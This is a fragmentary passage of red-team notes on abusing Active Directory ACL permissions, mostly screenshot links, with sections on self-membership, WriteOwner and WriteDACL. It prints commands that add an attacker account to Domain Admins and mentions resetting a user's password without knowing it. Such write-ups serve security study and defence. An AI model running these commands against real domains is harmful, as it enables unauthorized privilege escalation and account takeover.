...
![](<../../_assets/Screenshot from 2018-11-08 20-21-25.png>)
...
![](<../../_assets/Screenshot from 2018-11-07 20-19-43.png>)

We can reset user's `delegate` password without knowing the current password:

![](<../../_assets/Screenshot from 2018-11-07 20-21-30 (1).png>)
...
![](<../../_assets/Screenshot from 2018-11-08 09-50-20.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 09-52-10.png>)
...
![](<../../_assets/Peek 2018-11-08 10-07.gif>)
...
![](<../../_assets/Screenshot from 2018-11-08 11-11-11.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 11-06-32.png>)

### Self (Self-Membership) on Group

Another privilege that enables the attacker adding themselves to a group:

![](<../../_assets/Screenshot from 2018-11-08 11-23-52.png>)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](<../../_assets/Screenshot from 2018-11-08 11-25-23.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 15-21-35.png>)

```csharp
net group "domain admins" spotless /add /domain
```

![](<../../_assets/Screenshot from 2018-11-08 15-22-50.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 12-30-11.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 12-31-52.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 14-11-25.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 12-58-25.png>)

### WriteOwner on Group

Note how before the attack the owner of `Domain Admins` is `Domain Admins`:

![](<../../_assets/Screenshot from 2018-11-08 16-45-36.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 16-45-42.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 16-54-59.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 19-12-04.png>)
...
![](<../../_assets/Screenshot from 2018-11-08 19-13-45.png>)

### WriteDACL + WriteOwner

If you are the owner of a group, like I'm the owner of a `Test` AD group:

![](<../../_assets/Screenshot from 2018-11-10 19-02-57.png>)
...
![](<../../_assets/Screenshot from 2018-11-10 19-29-27.png>)

And you have a `WriteDACL` on that AD object:

![](<../../_assets/Screenshot from 2018-11-10 19-07-16.png>)
...
![](<../../_assets/Screenshot from 2018-11-10 19-02-49.png>)
...
![](<../../_assets/Screenshot from 2018-11-10 19-09-08.png>)
...
[source record](../../sources/redteamingtactics/abusing-active-directory-acls-aces.md)
